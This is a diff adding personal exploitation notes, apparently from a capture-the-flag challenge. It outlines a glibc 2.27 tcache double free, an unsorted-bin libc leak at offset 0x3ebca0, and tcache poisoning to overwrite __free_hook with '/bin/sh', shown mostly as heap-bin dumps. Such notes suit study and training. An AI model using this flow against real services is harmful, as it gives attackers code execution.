@@ -1,0 +1,41 @@
+libc 2.27 -> tcache
+流程：tcache -> unsorted bin -> leak libc -> free_hook
+
+
+
+#### After loop 7 times ####
+
+Tcachebins[idx=2, size=0x40] count=2  ←  Chunk(addr=0x56019cad3300, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x56019cad3300, size=0x40, flags=PREV_INUSE)  →  [loop detected]
+Tcachebins[idx=8, size=0xa0] count=8  ←  Chunk(addr=0x56019cad3260, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x56019cad3260, size=0xa0, flags=PREV_INUSE)  →  [loop detected]
+
+
+
+
+#### After 8th time #### 因為每個Tcachebin的上限是7
+
+Tcachebins[idx=2, size=0x40] count=2  ←  Chunk(addr=0x555e5904f300, size=0x40, flags=)  ←  Chunk(addr=0x555e5904f300, size=0x40, flags=)  →  [loop detected]
+Tcachebins[idx=8, size=0xa0] count=7  ←  Chunk(addr=0x555e5904f260, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x7ffbd3f33ca0, size=0x0, flags=)  ←  Chunk(addr=0x555e5904f330, size=0x0, flags=)
+
+[+] unsorted_bins[0]: fw=0x555e5904f250, bk=0x555e5904f250
+ →   Chunk(addr=0x555e5904f260, size=0xa0, flags=PREV_INUSE)
+[+] Found 1 chunks in unsorted bin.
+
+
+
+#### View 0 ####
+拿到unsorted bin的開頭，減掉0x3ebca0為libc_base（從ps -aux, cat /proc/<id>/maps得來）
+
+
+
+
+#### After add(0x30, p64(free_hook)) ####
+
+Tcachebins[idx=2, size=0x40] count=1  ←  Chunk(addr=0x555e5904f300, size=0x40, flags=)  ←  Chunk(addr=0x7fd3d31718e8, size=0x0, flags=) 
+Tcachebins[idx=8, size=0xa0] count=7  ←  Chunk(addr=0x555e5904f260, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x7ffbd3f33ca0, size=0x0, flags=)  ←  Chunk(addr=0x555e5904f330, size=0x0, flags=)
+
+
+
+#### After add(0x30, '/bin/sh\x00') ####
+
+Tcachebins[idx=2, size=0x40] count=0  ←  Chunk(addr=0x7fd3d31718e8, size=0x0, flags=) 
+Tcachebins[idx=8, size=0xa0] count=7  ←  Chunk(addr=0x555e5904f260, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x7ffbd3f33ca0, size=0x0, flags=)  ←  Chunk(addr=0x555e5904f330, size=0x0, flags=)
